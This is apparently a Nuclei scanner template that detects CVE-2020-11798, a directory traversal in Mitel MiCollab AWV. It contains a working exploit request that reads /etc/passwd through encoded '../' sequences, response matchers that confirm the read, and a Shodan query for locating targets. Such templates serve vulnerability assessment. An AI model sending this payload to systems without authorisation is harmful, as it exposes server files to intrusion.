id: CVE-2020-11798

info:
  name: Mitel MiCollab AWV 8.1.2.4 and 9.1.3 - Directory Traversal
  author: ritikchaddha
  severity: medium
  description: |
    A Directory Traversal vulnerability in the web conference component of Mitel MiCollab AWV before 8.1.2.4 and 9.x before 9.1.3 could allow an attacker to access arbitrary files from restricted directories of the server via a crafted URL, due to insufficient access validation. A successful exploit could allow an attacker to access sensitive information from the restricted directories.
  reference:
    - https://packetstormsecurity.com/files/171751/mma913-traversallfi.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11798
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-22
  metadata:
    max-request: 1
    verified: true
    shodan-query: html:"Mitel" html:"MiCollab"
  tags: cve,cve2020,mitel,micollab,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - application/x-download
          - filename=passwd
        condition: and

      - type: status
        status:
          - 200
